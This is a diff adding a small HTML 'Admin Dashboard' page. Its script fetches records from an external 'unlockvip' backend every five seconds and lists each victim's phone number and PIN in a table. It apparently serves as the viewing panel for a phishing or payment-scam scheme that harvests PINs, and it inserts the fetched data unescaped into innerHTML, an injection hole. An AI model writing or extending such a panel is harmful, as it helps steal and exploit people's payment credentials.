@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<title>Admin Dashboard</title>
+
+<style>
+
+body{
+font-family:Arial;
+background:#111;
+color:white;
+padding:30px;
+}
+
+h1{
+text-align:center;
+}
+
+table{
+width:100%;
+border-collapse:collapse;
+margin-top:30px;
+}
+
+th,td{
+padding:10px;
+border:1px solid #444;
+text-align:center;
+}
+
+th{
+background:#222;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1>Admin Dashboard</h1>
+
+<table>
+
+<tr>
+<th>Phone</th>
+<th>PIN</th>
+</tr>
+
+<tbody id="table"></tbody>
+
+</table>
+
+<script>
+
+async function loadData(){
+
+const response = await fetch("https://unlockvip-backend.onrender.com/admin/payments")
+
+const data = await response.json()
+
+const table = document.getElementById("table")
+
+table.innerHTML=""
+
+data.forEach(item=>{
+
+table.innerHTML += `
+<tr>
+<td>${item.phone}</td>
+<td>${item.pin}</td>
+</tr>
+`
+
+})
+
+}
+
+loadData()
+
+setInterval(loadData,5000)
+
+</script>
+
+</body>
+
+</html>
